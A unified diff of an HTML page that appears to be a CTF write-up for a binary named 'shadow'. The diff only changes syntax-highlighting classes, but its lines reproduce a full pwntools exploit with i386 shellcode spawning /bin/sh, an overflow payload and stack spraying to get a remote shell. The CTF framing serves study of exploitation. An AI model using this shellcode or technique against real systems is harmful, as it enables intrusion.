@@ -326,27 +326,27 @@ In the main function the program first ask us to input our name (the buffer was 
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./shadow"</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
-        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
         <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
     <span class="k">return</span> <span class="n">res</span>
 
 <span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">sc</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">sc</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"i386"</span><span class="p">:</span>
         <span class="c1"># shellcraft.i386.linux.sh(), null free, 22 bytes
 </span>        <span class="k">return</span> <span class="s">"</span><span class="se">\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80</span><span class="s">"</span>
@@ -363,11 +363,11 @@ In the main function the program first ask us to input our name (the buffer was 
         <span class="k">return</span> <span class="bp">None</span>
 
 <span class="k">def</span> <span class="nf">add_one</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">desr</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send desc length"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send desc"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">desr</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send desc length"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send desc"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">desr</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
     
@@ -377,38 +377,38 @@ In the main function the program first ask us to input our name (the buffer was 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
     <span class="c1">#r = process(ELF_PATH)
 </span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send name (shellcode)"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"it?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send name (shellcode)"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"it?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add one beer"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add one beer"</span><span class="p">)</span>
     <span class="n">add_one</span><span class="p">(</span><span class="mh">0x20000</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="s">"BBBB"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"beer uploaded to the memory!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add beer done"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"beer uploaded to the memory!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add beer done"</span><span class="p">)</span>
 
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"choose desc"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span> <span class="c1"># choose desc
-</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span> <span class="c1"># input index
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"choose desc"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span> <span class="c1"># choose desc
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span> <span class="c1"># input index
 </span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"recieving BBBB"</span><span class="p">)</span>
-    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"recieving rest output"</span><span class="p">)</span>
-    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"start stacking stack"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"recieving BBBB"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"recieving rest output"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"start stacking stack"</span><span class="p">)</span>
 
     <span class="n">maxx</span> <span class="o">=</span> <span class="mi">80000</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">maxx</span><span class="p">):</span>
         <span class="n">check</span> <span class="o">=</span> <span class="n">i</span><span class="o">%</span> <span class="mi">10000</span>
         <span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
             <span class="k">print</span> <span class="n">i</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"z"</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"z"</span><span class="p">)</span>
 
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="o">/</span><span class="mi">4</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="o">/</span><span class="mi">4</span><span class="p">))</span>
 
-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
